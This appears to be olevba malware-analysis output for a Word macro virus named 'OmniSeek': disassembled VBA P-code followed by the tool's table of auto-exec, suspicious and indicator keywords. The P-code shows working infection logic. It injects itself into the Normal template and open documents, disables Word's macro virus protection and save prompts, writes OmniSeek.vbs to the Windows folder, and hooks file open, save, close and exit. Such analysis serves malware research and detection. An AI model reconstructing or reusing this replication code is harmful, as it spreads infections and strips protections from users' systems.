' 	Next 
' Line #179:
' 	EndSub 
' Line #180:
' Line #181:
' 	FuncDefn (Sub Hawahan(d))
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	Dim 
' 	VarDefn comps
' 	VarDefn c
' 	VarDefn wala
' 	VarDefn n
' 	VarDefn tmp
' Line #184:
' 	SetStmt 
' 	Ld d 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set comps 
' Line #185:
' 	LitVarSpecial (True)
' 	St wala 
' Line #186:
' 	LitStr 0x0008 "OmniSeek"
' 	St n 
' Line #187:
' 	StartForVariable 
' 	Ld c 
' 	EndForVariable 
' 	Ld comps 
' 	ForEach 
' Line #188:
' 	Ld c 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #189:
' 	LitDI2 0x0001 
' 	Ld c 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld c 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St tmp 
' Line #190:
' 	Ld tmp 
' 	LitDI2 0x0BE8 
' 	ArgsLd Mid$ 0x0002 
' 	Ld teks 
' 	ArgsLd UCase 0x0001 
' 	LitDI2 0x0BE8 
' 	ArgsLd Mid$ 0x0002 
' 	Eq 
' 	IfBlock 
' Line #191:
' 	LitVarSpecial (False)
' 	St wala 
' Line #192:
' 	Ld d 
' 	MemLd FullName 
' 	Ld wrd 
' 	MemLd NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld wrd 
' 	MemLd NormalTemplate 
' 	MemSt Saved 
' 	EndIf 
' Line #193:
' 	Ld c 
' 	ArgsLd isThreat 0x0001 
' 	ElseIfBlock 
' Line #194:
' 	Ld c 
' 	MemLd New 
' 	St n 
' Line #195:
' 	Ld c 
' 	Ld comps 
' 	ArgsMemCall Remove 0x0001 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	StartForVariable 
' 	Next 
' Line #199:
' 	Ld wala 
' 	IfBlock 
' Line #200:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld comps 
' 	ArgsMemLd Add 0x0001 
' 	Set c 
' Line #201:
' 	Ld teks 
' 	Paren 
' 	Ld c 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #202:
' 	Ld n 
' 	Ld c 
' 	MemSt New 
' Line #203:
' 	LitVarSpecial (True)
' 	St seyba 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	EndSub 
' Line #206:
' Line #207:
' 	FuncDefn (Sub startOmni())
' Line #208:
' 	OnError (Resume Next) 
' Line #209:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall InitVBA 0x0001 
' Line #210:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall ChkVBS 0x0001 
' Line #211:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #212:
' 	EndSub 
' Line #213:
' Line #214:
' 	FuncDefn (Sub InitVBA(x))
' Line #215:
' 	Dim 
' 	VarDefn j
' 	VarDefn vbcs
' Line #216:
' 	OnError (Resume Next) 
' Line #217:
' 	SetStmt 
' 	Ld Application 
' 	Set wrd 
' Line #218:
' 	LitDI2 0x0004 
' 	Ld RecentFiles 
' 	MemSt Maximum 
' Line #219:
' 	Ld WordBasic 
' 	ArgsMemCall disableautomacros 0x0000 
' Line #220:
' 	LitVarSpecial (False)
' 	St seyba 
' Line #221:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #222:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #223:
' 	SetStmt 
' 	Ld wrd 
' 	MemLd MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set vbcs 
' Line #224:
' 	Ld vbcs 
' 	MemLd Count 
' 	St j 
' Line #225:
' 	LitDI2 0x0001 
' 	Ld j 
' 	ArgsLd vbcs 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld j 
' 	ArgsLd vbcs 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St teks 
' Line #226:
' 	EndSub 
' Line #227:
' Line #228:
' 	FuncDefn (Function ChkVBS(x))
' Line #229:
' 	Dim 
' 	VarDefn fnm
' 	VarDefn i
' 	VarDefn j
' 	VarDefn txt
' Line #230:
' 	OnError (Resume Next) 
' Line #231:
' 	LitVarSpecial (False)
' 	St ChkVBS 
' Line #232:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set False 
' Line #233:
' 	LitDI2 0x0001 
' 	ArgsLd getWindir 0x0001 
' 	St windir 
' Line #234:
' 	Ld Err 
' 	Ld windir 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #235:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd UCase 0x0001 
' 	Ld False 
' 	ArgsMemLd getfile 0x0001 
' 	Set i 
' Line #236:
' 	LitDI2 0x0000 
' 	Ld i 
' 	MemSt Attributes 
' Line #237:
' 	Ld windir 
' 	LitStr 0x000C "OmniSeek.vbs"
' 	Ld False 
' 	ArgsMemLd buildpath 0x0002 
' 	St fnm 
' Line #238:
' 	Ld fnm 
' 	Ld False 
' 	ArgsMemLd FileExists 0x0001 
' 	IfBlock 
' Line #239:
' 	LitVarSpecial (True)
' 	St ChkVBS 
' Line #240:
' 	ElseBlock 
' Line #241:
' 	Ld teks 
' 	LitStr 0x0007 "'Simula"
' 	FnInStr 
' 	St i 
' Line #242:
' 	Ld teks 
' 	LitStr 0x000D "Sub Simula(x)"
' 	FnInStr 
' 	St j 
' Line #243:
' 	Ld teks 
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0008 "Simula 1"
' 	Add 
' 	Ld vbCrLf 
' 	Add 
' 	Ld teks 
' 	Ld j 
' 	ArgsLd Mid$ 0x0002 
' 	Add 
' 	St txt 
' Line #244:
' 	Ld fnm 
' 	Ld txt 
' 	ArgsCall writeTxt 0x0002 
' Line #245:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall insertINI 0x0001 
' Line #246:
' 	EndIfBlock 
' Line #247:
' 	Ld windir 
' 	LitStr 0x000C "OFFITEMS.LOG"
' 	Ld False 
' 	ArgsMemLd buildpath 0x0002 
' 	St fnm 
' Line #248:
' 	SetStmt 
' 	Ld fnm 
' 	Ld False 
' 	ArgsMemLd getfile 0x0001 
' 	Set i 
' Line #249:
' 	LitDI2 0x0000 
' 	Ld i 
' 	MemSt Attributes 
' Line #250:
' 	Ld i 
' 	MemLd Size 
' 	LitDI4 0x869F 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld fnm 
' 	LitVarSpecial (True)
' 	Ld False 
' 	ArgsMemCall deletefile 0x0002 
' 	EndIf 
' Line #251:
' 	LitVarSpecial (True)
' 	St ChkVBS 
' Line #252:
' 	EndFunc 
' Line #253:
' Line #254:
' 	FuncDefn (Sub SeybNa(x))
' Line #255:
' 	Dim 
' 	VarDefn d
' Line #256:
' 	OnError (Resume Next) 
' Line #257:
' 	Ld seyba 
' 	IfBlock 
' Line #258:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld wrd 
' 	MemLd Documents 
' 	ForEach 
' Line #259:
' 	Ld d 
' 	MemLd ReadOnly 
' 	Not 
' 	IfBlock 
' Line #260:
' 	Ld d 
' 	ArgsMemCall Save 0x0000 
' Line #261:
' 	Ld d 
' 	ArgsMemCall Close 0x0000 
' Line #262:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	Ld d 
' 	ArgsMemCall Close 0x0001 
' Line #263:
' 	EndIfBlock 
' Line #264:
' 	StartForVariable 
' 	Next 
' Line #265:
' 	LitVarSpecial (False)
' 	St seyba 
' Line #266:
' 	EndIfBlock 
' Line #267:
' 	EndSub 
' Line #268:
' Line #269:
' 	FuncDefn (Sub ToolsOptions())
' Line #270:
' 	OnError (Resume Next) 
' Line #271:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #272:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall InitVBA 0x0001 
' Line #273:
' 	EndSub 
' Line #274:
' Line #275:
' 	FuncDefn (Sub ToolsMacro())
' Line #276:
' 	OnError (Resume Next) 
' Line #277:
' 	ArgsCall startOmni 0x0000 
' Line #278:
' 	Ld wdDialogToolsMacro 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #279:
' 	EndSub 
' Line #280:
' Line #281:
' 	FuncDefn (Sub ViewVBCode())
' Line #282:
' 	OnError (Resume Next) 
' Line #283:
' 	ArgsCall startOmni 0x0000 
' Line #284:
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' Line #285:
' 	EndSub 
' Line #286:
' Line #287:
' 	FuncDefn (Sub AutoOpen())
' Line #288:
' 	OnError (Resume Next) 
' Line #289:
' 	ArgsCall startOmni 0x0000 
' Line #290:
' 	EndSub 
' Line #291:
' Line #292:
' 	FuncDefn (Sub FileOpen())
' Line #293:
' 	OnError (Resume Next) 
' Line #294:
' 	Dim 
' 	VarDefn vbcs
' Line #295:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall InitVBA 0x0001 
' Line #296:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #297:
' 	StartWithExpr 
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #298:
' 	ArgsMemCallWith Display 0x0000 
' Line #299:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #300:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set vbcs 
' Line #301:
' 	Ld Now 
' 	LitStr 0x0008 "00:00:01"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "Normal."
' 	Ld vbcs 
' 	MemLd Count 
' 	ArgsLd vbcs 0x0001 
' 	MemLd New 
' 	Add 
' 	LitStr 0x000A ".startOmni"
' 	Add 
' 	LitDI2 0x0000 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0003 
' Line #302:
' 	ArgsMemCallWith Execute 0x0000 
' Line #303:
' 	EndWith 
' Line #304:
' 	EndSub 
' Line #305:
' Line #306:
' 	FuncDefn (Sub FileSave())
' Line #307:
' 	OnError (Resume Next) 
' Line #308:
' 	Dim 
' 	VarDefn t
' Line #309:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St t 
' Line #310:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #311:
' 	Ld ActiveDocument 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #312:
' 	Ld t 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #313:
' 	ArgsCall FileSaveAs 0x0000 
' Line #314:
' 	ElseBlock 
' Line #315:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Not 
' 	IfBlock 
' Line #316:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall InitVBA 0x0001 
' Line #317:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #318:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #319:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall ChkVBS 0x0001 
' Line #320:
' 	EndIfBlock 
' Line #321:
' 	EndIfBlock 
' Line #322:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #323:
' 	Ld t 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #324:
' 	EndSub 
' Line #325:
' Line #326:
' 	FuncDefn (Sub FileSaveAs())
' Line #327:
' 	OnError (Resume Next) 
' Line #328:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #329:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall InitVBA 0x0001 
' Line #330:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #331:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall ChkVBS 0x0001 
' Line #332:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #333:
' 	EndSub 
' Line #334:
' Line #335:
' 	FuncDefn (Sub FileClose())
' Line #336:
' 	OnError (Resume Next) 
' Line #337:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall InitVBA 0x0001 
' Line #338:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall HawaNa 0x0001 
' Line #339:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall ChkVBS 0x0001 
' Line #340:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #341:
' 	EndSub 
' Line #342:
' Line #343:
' 	FuncDefn (Sub FileExit())
' Line #344:
' 	OnError (Resume Next) 
' Line #345:
' 	ArgsCall startOmni 0x0000 
' Line #346:
' 	LitDI2 0x0001 
' 	Paren 
' 	ArgsCall SeybNa 0x0001 
' Line #347:
' 	Ld wrd 
' 	ArgsMemCall Quit 0x0000 
' Line #348:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOEXIT            |Runs when the Word document is closed        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|RUN                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |OmniSeek.vbs        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

